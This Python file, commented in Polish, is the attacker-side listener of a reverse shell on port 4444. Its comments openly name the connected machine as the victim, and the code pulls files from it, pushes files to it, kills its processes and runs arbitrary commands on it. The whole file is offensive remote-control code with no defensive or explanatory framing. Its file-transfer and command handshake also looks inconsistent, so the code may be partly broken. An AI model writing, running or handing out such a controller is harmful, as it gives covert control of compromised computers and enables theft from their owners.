import socket
import os
import subprocess

HOST = '0.0.0.0'  # nasłuch na wszystkich interfejsach
PORT = 4444

def handle_client(conn, addr):
    print(f"Połączono z {addr}")
    current_dir = os.getcwd()
    while True:
        try:
            command = input("shell> ")
            if not command:
                continue
            conn.send(command.encode())

            if command.lower() == 'exit':
                break
            elif command.startswith('download '):
                # Pobranie pliku z ofiary
                filename = command.split(' ', 1)[1]
                conn.send(b'READY')  # synchronizacja
                with open(filename, 'wb') as f:
                    while True:
                        data = conn.recv(4096)
                        if data.endswith(b'FILE_TRANSFER_COMPLETE'):
                            f.write(data[:-len(b'FILE_TRANSFER_COMPLETE')])
                            break
                        f.write(data)
                print(f"Pobrano plik: {filename}")
            elif command.startswith('upload '):
                # Wysłanie pliku do ofiary
                _, filename = command.split(' ', 1)
                if os.path.isfile(filename):
                    conn.send(b'READY')
                    with open(filename, 'rb') as f:
                        chunk = f.read(4096)
                        while chunk:
                            conn.send(chunk)
                            chunk = f.read(4096)
                    conn.send(b'FILE_TRANSFER_COMPLETE')
                    print(f"Wysłano plik: {filename}")
                else:
                    conn.send(b'FILE_NOT_FOUND')
            elif command.startswith('kill '):
                # Zamknięcie procesu po nazwie (np. notepad.exe)
                process_name = command.split(' ', 1)[1]
                conn.send(f'kill {process_name}'.encode())
            else:
                # Wykonanie dowolnego polecenia systemowego na ofierze
                conn.send(b'EXEC')  # tryb wykonania
                response = conn.recv(4096).decode(errors='ignore')
                print(response, end='')
        except (ConnectionResetError, BrokenPipeError):
            print("Połączenie zerwane.")
            break
        except Exception as e:
            print(f"Błąd: {e}")
            break
    conn.close()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"Serwer nasłuchuje na porcie {PORT}...")
        conn, addr = s.accept()
        handle_client(conn, addr)

if __name__ == '__main__':
    main()
